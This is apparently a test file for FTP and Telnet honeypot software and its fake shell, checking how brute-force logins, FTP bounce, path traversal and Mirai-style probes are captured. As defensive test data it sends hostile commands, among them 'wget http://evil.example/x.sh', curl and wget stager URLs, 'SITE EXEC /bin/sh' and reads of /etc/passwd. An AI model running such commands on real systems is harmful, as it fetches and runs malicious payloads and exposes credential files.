import net from "node:net";
import { afterEach, describe, expect, it } from "vitest";
import { FtpHoneypot, MemoryStore, TelnetCodec, TelnetHoneypot, fakeShellOutput } from "../src/index.js";
import type { HoneypotHit } from "../src/index.js";

/** Let the `void this.report(...)` calls settle before asserting on what was recorded. */
const settle = (ms = 60): Promise<void> => new Promise((r) => setTimeout(r, ms));

function portOf(honeypot: { address: () => unknown }): number {
  return (honeypot.address() as { port: number }).port;
}

/**
 * Drives a line-per-reply protocol: send the next scripted line each time the server
 * answers. FTP answers every command, so this stays in step as long as the script
 * avoids the multi-line replies (FEAT, STAT).
 */
function session(port: number, lines: string[], timeoutMs = 3000): Promise<string> {
  return new Promise((resolve, reject) => {
    const socket = net.createConnection({ port, host: "127.0.0.1" });
    let transcript = "";
    let i = 0;
    socket.setTimeout(timeoutMs, () => socket.destroy());
    socket.on("data", (d) => {
      transcript += d.toString();
      if (i < lines.length) socket.write(`${lines[i++]}\r\n`);
      else socket.end();
    });
    socket.on("close", () => resolve(transcript));
    socket.on("error", reject);
  });
}

describe("FTP honeypot", () => {
  let ftp: FtpHoneypot | undefined;
  afterEach(async () => {
    await ftp?.close();
    ftp = undefined;
  });

  async function start(options: Partial<ConstructorParameters<typeof FtpHoneypot>[0]> = {}): Promise<{ port: number; hits: HoneypotHit[] }> {
    const hits: HoneypotHit[] = [];
    ftp = new FtpHoneypot({
      port: 0,
      host: "127.0.0.1",
      store: new MemoryStore(),
      onHit: (h) => {
        hits.push(h);
      },
      ...options,
    });
    await ftp.listen();
    return { port: portOf(ftp), hits };
  }

  const findingsOf = (hits: HoneypotHit[]): string[] => hits.map((h) => h.detections[0]?.detectorId ?? "");

  it("captures a USER/PASS brute-force attempt in the clear", async () => {
    const { port, hits } = await start();
    await session(port, ["USER admin", "PASS hunter2", "QUIT"]);
    await settle();

    const auth = hits.find((h) => h.detections[0]?.detectorId === "ftp-auth-bruteforce");
    expect(auth).toBeTruthy();
    expect(auth?.method).toBe("FTP");
    expect(auth?.headers["ftp-user"]).toBe("admin");
    expect(auth?.headers["x-protocol"]).toBe("ftp");
    // The captured password is the product; it rides in the body like SSH's.
    expect(auth?.body).toBe("hunter2");
  });

  it("distinguishes an anonymous login from a guessed credential", async () => {
    const { port, hits } = await start();
    await session(port, ["USER anonymous", "PASS scanner@example.com", "QUIT"]);
    await settle();

    expect(findingsOf(hits)).toContain("ftp-anonymous-login");
    expect(findingsOf(hits)).not.toContain("ftp-auth-bruteforce");
  });

  it("flags a PORT naming a third party as a bounce, and leaves the client's own address alone", async () => {
    const { port, hits } = await start();
    // 10,0,0,1 is not the connecting client, so this asks us to dial somebody else.
    await session(port, ["USER anonymous", "PASS x@x", "PORT 10,0,0,1,4,1", "QUIT"]);
    await settle();

    const bounce = hits.find((h) => h.detections[0]?.detectorId === "ftp-bounce");
    expect(bounce).toBeTruthy();
    expect(bounce?.headers["ftp-bounce-target"]).toBe("10.0.0.1:1025");

    const own = await start();
    await session(own.port, ["USER anonymous", "PASS x@x", "PORT 127,0,0,1,4,1", "QUIT"]);
    await settle();
    expect(findingsOf(own.hits)).not.toContain("ftp-bounce");
  });

  it("reports a bounce even though the command itself is refused for want of a login", async () => {
    // The default configuration never grants a login, so a detection gated on being
    // logged in would never fire at all. The ask is the evidence, not the outcome.
    const { port, hits } = await start();
    const transcript = await session(port, ["PORT 198,51,100,7,4,1", "QUIT"]);
    await settle();

    expect(findingsOf(hits)).toContain("ftp-bounce");
    expect(transcript).toContain("530 Please login");
  });

  it("flags path traversal in a file command", async () => {
    const { port, hits } = await start();
    await session(port, ["USER anonymous", "PASS x@x", "RETR ../../etc/passwd", "QUIT"]);
    await settle();

    const traversal = hits.find((h) => h.detections[0]?.detectorId === "ftp-traversal");
    expect(traversal).toBeTruthy();
    expect(traversal?.body).toContain("../../etc/passwd");
  });

  it("in interactive mode, accepts the login and captures the commands that follow", async () => {
    const { port, hits } = await start({ interactive: true, acceptOnAttempt: 1 });
    const transcript = await session(port, ["USER root", "PASS toor", "CWD /var/www", "STOR shell.php", "QUIT"]);
    await settle();

    expect(transcript).toContain("230 Login successful");
    const commands = hits.filter((h) => h.detections[0]?.detectorId === "ftp-command").map((h) => h.body);
    expect(commands).toContain("CWD /var/www");
    expect(commands).toContain("STOR shell.php");
  });

  it("answers the whole command surface with a well-formed reply", async () => {
    // The replies are the bait: a client that gets a malformed one gives up, and the
    // session ends before anything worth capturing happens. FEAT and STAT answer with
    // several lines, so this one is paced rather than driven off each reply.
    const { port } = await start({ interactive: true, acceptOnAttempt: 1 });
    const commands = [
      "USER root", "PASS toor", "SYST", "FEAT", "PWD", "XPWD", "TYPE I", "TYPE A", "MODE S", "STRU F",
      "NOOP", "CLNT curl/8.0", "OPTS UTF8 ON", "PASV", "EPSV", "LIST", "NLST /pub", "RETR readme.txt",
      "STOR upload.bin", "APPE more.bin", "CWD /var", "CDUP", "MKD newdir", "RMD newdir", "DELE old.txt",
      "RNFR a.txt", "RNTO b.txt", "RNTO orphan.txt", "SITE EXEC /bin/sh", "SIZE a.txt", "MDTM a.txt",
      "STAT", "HELP", "AUTH TLS", "ABOR", "REIN", "PORT bogus", "EPRT |1|nonsense|", "FROBNICATE", "QUIT",
    ];
    const transcript = await new Promise<string>((resolve) => {
      const socket = net.createConnection({ port, host: "127.0.0.1" });
      let seen = "";
      socket.setTimeout(6000, () => socket.destroy());
      socket.on("data", (d) => (seen += d.toString()));
      socket.on("close", () => resolve(seen));
      socket.on("error", () => resolve(seen));
      socket.on("connect", async () => {
        for (const command of commands) {
          socket.write(`${command}\r\n`);
          await new Promise((r) => setTimeout(r, 12));
        }
        await new Promise((r) => setTimeout(r, 60));
        socket.end();
      });
    });

    const lines = transcript.split("\r\n").filter(Boolean);
    // Every line is either a reply code or a continuation of a multi-line one.
    for (const line of lines) expect(line).toMatch(/^(\d{3}[ -]| )/);
    // No command fell through to a 5xx it should have handled.
    expect(transcript).toContain("215 UNIX Type: L8");
    expect(transcript).toContain('257 "/" is the current directory');
    expect(transcript).toContain("350 Ready for RNTO");
    expect(transcript).toContain("503 RNFR required first"); // the orphan RNTO
    expect(transcript).toContain("501 Illegal PORT command"); // both malformed addresses
    expect(transcript).toContain("500 Unknown command"); // FROBNICATE
    expect(transcript).toContain("221 Goodbye");
  });

  it("records a connection that takes the banner and leaves as a scan", async () => {
    const { port, hits } = await start();
    await new Promise<void>((resolve) => {
      const socket = net.createConnection({ port, host: "127.0.0.1" });
      socket.on("data", () => socket.end());
      socket.on("close", () => resolve());
      socket.on("error", () => resolve());
    });
    await settle();

    expect(findingsOf(hits)).toEqual(["ftp-scan"]);
  });

  it("refuses a connection from an IP already over dropAboveScore", async () => {
    const store = new MemoryStore();
    await store.record({
      id: "seed",
      timestamp: new Date().toISOString(),
      ip: "127.0.0.1",
      method: "GET",
      path: "/.env",
      headers: {},
      detections: [{ detectorId: "sensitive-file", reason: "seed", score: 50 }],
      score: 50,
      totalScore: 50,
      respondedWith: "block",
    });
    const { port } = await start({ store, dropAboveScore: 10 });

    const transcript = await session(port, ["USER admin", "PASS admin"]);
    expect(transcript).toContain("421 Service not available");
    expect(transcript).not.toContain("331");
  });
});

describe("Telnet option negotiation", () => {
  it("strips IAC commands out of the data stream", () => {
    const codec = new TelnetCodec();
    // IAC DO ECHO, then "root", then IAC WILL SGA.
    const chunk = Buffer.from([255, 253, 1, 0x72, 0x6f, 0x6f, 0x74, 255, 251, 3]);
    const { data } = codec.feed(chunk);
    expect(data.toString()).toBe("root");
  });

  it("parses a command split across chunks rather than leaking 0xFF into the data", () => {
    const codec = new TelnetCodec();
    // One byte at a time is something an attacker can trivially arrange.
    const bytes = [255, 253, 1, 0x61];
    let data = "";
    for (const b of bytes) data += codec.feed(Buffer.from([b])).data.toString();
    expect(data).toBe("a");
  });

  it("treats IAC IAC as one literal 0xFF byte of data", () => {
    const codec = new TelnetCodec();
    const { data } = codec.feed(Buffer.from([255, 255, 0x41]));
    expect([...data]).toEqual([255, 0x41]);
  });

  it("refuses options it did not announce, and never answers one it did", () => {
    const codec = new TelnetCodec();
    // DO ECHO: already announced WILL ECHO in the greeting, so answering again loops.
    expect([...codec.feed(Buffer.from([255, 253, 1])).reply]).toEqual([]);
    // DO for something else earns exactly one refusal.
    expect([...codec.feed(Buffer.from([255, 253, 34])).reply]).toEqual([255, 252, 34]);
    // And only one, however many times it is asked.
    expect([...codec.feed(Buffer.from([255, 253, 34])).reply]).toEqual([]);
  });

  it("stops replying once the negotiation cap is reached, so it cannot be used as an amplifier", () => {
    const codec = new TelnetCodec({ maxReplies: 2, announced: [] });
    let replyBytes = 0;
    for (let option = 40; option < 60; option += 1) {
      replyBytes += codec.feed(Buffer.from([255, 253, option])).reply.length;
    }
    expect(replyBytes).toBe(6); // two three-byte refusals, then silence
  });

  it("reads a terminal type out of a sub-negotiation and ignores the rest", () => {
    const codec = new TelnetCodec();
    const payload = [255, 250, 24, 0, ...Buffer.from("XTERM"), 255, 240];
    const { data, terminal } = codec.feed(Buffer.from(payload));
    expect(terminal).toBe("XTERM");
    expect(data.length).toBe(0);
  });

  it("survives a sub-negotiation that never ends without buffering it without bound", () => {
    const codec = new TelnetCodec({ maxSubnegBytes: 8 });
    const huge = Buffer.concat([Buffer.from([255, 250, 24, 0]), Buffer.alloc(10_000, 0x41)]);
    expect(() => codec.feed(huge)).not.toThrow();
    // Still inside the sub-negotiation, so nothing has leaked into the data stream.
    expect(codec.feed(Buffer.from([0x42])).data.length).toBe(0);
  });
});

describe("Telnet honeypot", () => {
  let telnet: TelnetHoneypot | undefined;
  afterEach(async () => {
    await telnet?.close();
    telnet = undefined;
  });

  async function start(options: Partial<ConstructorParameters<typeof TelnetHoneypot>[0]> = {}): Promise<{ port: number; hits: HoneypotHit[] }> {
    const hits: HoneypotHit[] = [];
    telnet = new TelnetHoneypot({
      port: 0,
      host: "127.0.0.1",
      store: new MemoryStore(),
      onHit: (h) => {
        hits.push(h);
      },
      ...options,
    });
    await telnet.listen();
    return { port: portOf(telnet), hits };
  }

  /**
   * Drives the login flow by watching for the prompts rather than by timing, so the
   * test cannot race the server's own writes.
   */
  function login(port: number, writes: Array<{ after: string; send: Buffer | string }>, timeoutMs = 3000): Promise<string> {
    return new Promise((resolve, reject) => {
      const socket = net.createConnection({ port, host: "127.0.0.1" });
      let seen = "";
      let i = 0;
      socket.setTimeout(timeoutMs, () => socket.destroy());
      socket.on("data", (d) => {
        seen += d.toString("latin1");
        while (i < writes.length && seen.includes(writes[i]!.after)) {
          const step = writes[i++]!;
          socket.write(typeof step.send === "string" ? Buffer.from(step.send) : step.send);
        }
        if (i >= writes.length && seen.includes("Login incorrect")) socket.end();
      });
      socket.on("close", () => resolve(seen));
      socket.on("error", reject);
    });
  }

  it("captures the login and password pair in the clear", async () => {
    const { port, hits } = await start();
    await login(port, [
      { after: "login: ", send: "root\r\n" },
      { after: "Password: ", send: "xc3511\r\n" },
    ]);
    await settle();

    const auth = hits.find((h) => h.detections[0]?.detectorId === "telnet-auth-bruteforce");
    expect(auth).toBeTruthy();
    expect(auth?.method).toBe("TELNET");
    expect(auth?.headers["telnet-user"]).toBe("root");
    expect(auth?.body).toBe("xc3511");
  });

  it("keeps IAC negotiation out of the captured credential", async () => {
    const { port, hits } = await start();
    // A real client interleaves negotiation with the first keystrokes. Without the
    // codec those 0xFF bytes end up inside the username we record.
    const dirtyUser = Buffer.concat([Buffer.from([255, 251, 24]), Buffer.from("admin"), Buffer.from([255, 253, 1]), Buffer.from("\r\n")]);
    await login(port, [
      { after: "login: ", send: dirtyUser },
      { after: "Password: ", send: "admin\r\n" },
    ]);
    await settle();

    const auth = hits.find((h) => h.detections[0]?.detectorId === "telnet-auth-bruteforce");
    expect(auth?.headers["telnet-user"]).toBe("admin");
  });

  it("echoes the username but never the password", async () => {
    const { port } = await start();
    const seen = await login(port, [
      { after: "login: ", send: "operator\r\n" },
      { after: "Password: ", send: "s3cret\r\n" },
    ]);

    // The username comes back keystroke by keystroke; the password does not appear at all.
    expect(seen).toContain("operator");
    expect(seen).not.toContain("s3cret");
  });

  it("re-prompts after a failure so a botnet hands over its whole credential list", async () => {
    const { port, hits } = await start({ maxAuthAttempts: 3 });
    await login(port, [
      { after: "login: ", send: "root\r\n" },
      { after: "Password: ", send: "first\r\n" },
      { after: "login: ", send: "admin\r\n" },
      { after: "Password: ", send: "second\r\n" },
    ]);
    await settle();

    const passwords = hits.filter((h) => h.detections[0]?.detectorId === "telnet-auth-bruteforce").map((h) => h.body);
    expect(passwords).toEqual(["first", "second"]);
  });

  it("in interactive mode, captures the commands run in the fake shell", async () => {
    const { port, hits } = await start({ interactive: true, acceptOnAttempt: 1 });
    await new Promise<void>((resolve, reject) => {
      const socket = net.createConnection({ port, host: "127.0.0.1" });
      const script = ["root\r\n", "xc3511\r\n", "/bin/busybox MIRAI\r\n", "wget http://evil.example/x.sh\r\n", "exit\r\n"];
      let i = 0;
      let seen = "";
      socket.setTimeout(4000, () => socket.destroy());
      socket.on("data", (d) => {
        seen += d.toString("latin1");
        // Advance on each prompt the server writes: login, password, then the shell.
        if (i === 0 && seen.includes("login: ")) socket.write(script[i++]!);
        else if (i === 1 && seen.includes("Password: ")) socket.write(script[i++]!);
        else if (i >= 2 && i < script.length && seen.endsWith("# ")) socket.write(script[i++]!);
      });
      socket.on("close", () => resolve());
      socket.on("error", reject);
    });
    await settle(120);

    const commands = hits.filter((h) => h.detections[0]?.detectorId === "telnet-command").map((h) => h.body);
    expect(commands).toContain("/bin/busybox MIRAI");
    expect(commands).toContain("wget http://evil.example/x.sh");

    const summary = hits.find((h) => h.detections[0]?.detectorId === "telnet-session");
    expect(summary).toBeTruthy();
    expect(Number(summary?.headers["telnet-command-count"])).toBeGreaterThanOrEqual(2);
  });

  it("records a connection that takes the banner and leaves as a scan", async () => {
    const { port, hits } = await start();
    await new Promise<void>((resolve) => {
      const socket = net.createConnection({ port, host: "127.0.0.1" });
      socket.on("data", () => socket.end());
      socket.on("close", () => resolve());
      socket.on("error", () => resolve());
    });
    await settle();

    expect(hits.map((h) => h.detections[0]?.detectorId)).toEqual(["telnet-scan"]);
  });
});

describe("the scripted fake shell", () => {
  it("answers the BusyBox applet probe the way a real device does", () => {
    // Mirai and its descendants fingerprint a target with `/bin/busybox <APPLET>` and
    // look for exactly this reply. Getting it wrong ends the session before the
    // dropper reveals anything.
    expect(fakeShellOutput("/bin/busybox ECCHI")).toBe("ECCHI: applet not found\r\n");
    expect(fakeShellOutput("busybox")).toContain("multi-call binary");
  });

  it("fetches nothing for a stager command", () => {
    // The URL has already been captured by the caller; that is the entire value. There
    // must be no path from here to a network call.
    expect(fakeShellOutput("wget http://198.51.100.9/bins.sh")).toBe("");
    expect(fakeShellOutput("curl http://198.51.100.9/x")).toBe("");
  });

  it("keeps the identity answers consistent with the session's user", () => {
    expect(fakeShellOutput("whoami", { user: "root" })).toBe("root\r\n");
    expect(fakeShellOutput("whoami", { user: "deploy" })).toBe("deploy\r\n");
    expect(fakeShellOutput("id", { user: "root" })).toContain("uid=0(root)");
    expect(fakeShellOutput("id", { user: "deploy" })).toContain("uid=1000(deploy)");
    expect(fakeShellOutput("pwd", { user: "root" })).toBe("/root\r\n");
    expect(fakeShellOutput("pwd", { user: "deploy" })).toBe("/home/deploy\r\n");
  });

  it("reports the configured hostname rather than a hard-coded one", () => {
    expect(fakeShellOutput("hostname", { hostname: "db-prod-01" })).toBe("db-prod-01\r\n");
    expect(fakeShellOutput("uname -a", { hostname: "db-prod-01" })).toContain("db-prod-01");
    expect(fakeShellOutput("cat /etc/hostname", { hostname: "db-prod-01" })).toBe("db-prod-01\r\n");
    // Bare `uname` prints only the kernel name, as the real one does.
    expect(fakeShellOutput("uname")).toBe("Linux\r\n");
  });

  it("serves plausible contents for the files recon actually reads", () => {
    expect(fakeShellOutput("cat /etc/passwd")).toContain("root:x:0:0:root:/root:/bin/bash");
    expect(fakeShellOutput("cat /etc/shadow")).toContain("Permission denied");
    expect(fakeShellOutput("cat /proc/cpuinfo")).toContain("model name");
    expect(fakeShellOutput("cat /nope")).toContain("No such file or directory");
    expect(fakeShellOutput("ps")).toContain("systemd");
    expect(fakeShellOutput("df")).toContain("Filesystem");
    expect(fakeShellOutput("free")).toContain("Mem:");
    expect(fakeShellOutput("who", { user: "root" })).toContain("pts/0");
  });

  it("echoes back only the arguments, so a staging echo looks like it worked", () => {
    expect(fakeShellOutput("echo -e hello world")).toBe("hello world\r\n");
  });

  it("falls back to command-not-found, and says nothing at all for an empty line", () => {
    expect(fakeShellOutput("nmap")).toBe("nmap: command not found\r\n");
    expect(fakeShellOutput("   ")).toBe("");
    expect(fakeShellOutput("ls")).toBe("\r\n");
  });
});
